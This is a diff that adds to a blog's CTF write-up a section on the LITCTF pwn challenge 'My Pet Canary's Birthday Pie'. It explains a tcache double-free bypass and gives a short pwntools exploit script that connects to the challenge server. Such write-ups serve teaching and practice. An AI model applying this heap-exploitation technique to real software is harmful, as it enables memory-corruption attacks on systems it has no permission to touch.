@@ -257,6 +257,26 @@ I have got very less time, but I managed to solve challenges from few categories
 <img class=img-fluid alt="TFC CTF 2023" src="./images/pwn/piesol.png" loading="lazy">
 <p>LITCTF{rule_1_of_pwn:_use_checksec_I_think_06d2ee2b}</p>
 
+<h5>My Pet Canary's Birthday Pie</h5>
+<p>This challenge is based on a double free vulnerability. I literally spent so much time to talk with the other solvers of this challenge, then finally we understood the way this challenge worked.</p>
+<img class=img-fluid alt="TFC CTF 2023" src="./images/pwn/my.png" loading="lazy">
+<p>The leaked address is 0x5555555592f0 which is green, the malloc(64) gives 80 bytes of chunk so doing -80 goes to the top and doing +8 goes to 0x5555555592a0 which is violet pointing to tcache. Other solver also shared the same, you can see this:</p>
+<img class=img-fluid alt="TFC CTF 2023" src="./images/pwn/other.png" loading="lazy">
+<p>You can thus change the head to something other than c so that the double free is not detected what you can also do is just change the size of c, so that when it is freed again it does not go in the same bin so the double free is not detected. So, I wrote the following script to solve this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
+<span class="line"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="p">*</span></span>
+<span class="line">
+<span class="line"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'litctf.org'</span><span class="p">,</span> <span class="mi">31772</span><span class="p">)</span></span>
+<span class="line"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./s_patched'</span><span class="p">)</span></span>
+<span class="line">
+<span class="line"><span class="n">leak</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span></span>
+<span class="line"><span class="n">next_free_address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mi">80</span> <span class="o">+</span> <span class="mi">8</span></span>
+<span class="line"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="f">{next_free_address}</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span></span>
+<span class="line"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'anything'</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span></span>
+<span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvallS</span><span class="p">())</span></span>  
+</code></pre></div>
+<p>Here the leak was 0x5555555592f0 from the example.</p>
+
 </div><hr /><div class="post-navs d-flex mb-3 justify-content-evenly">
   <div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
     <a href="https://farmansk.github.io/posts/tfcctf2023/">TFCCTF Writeups
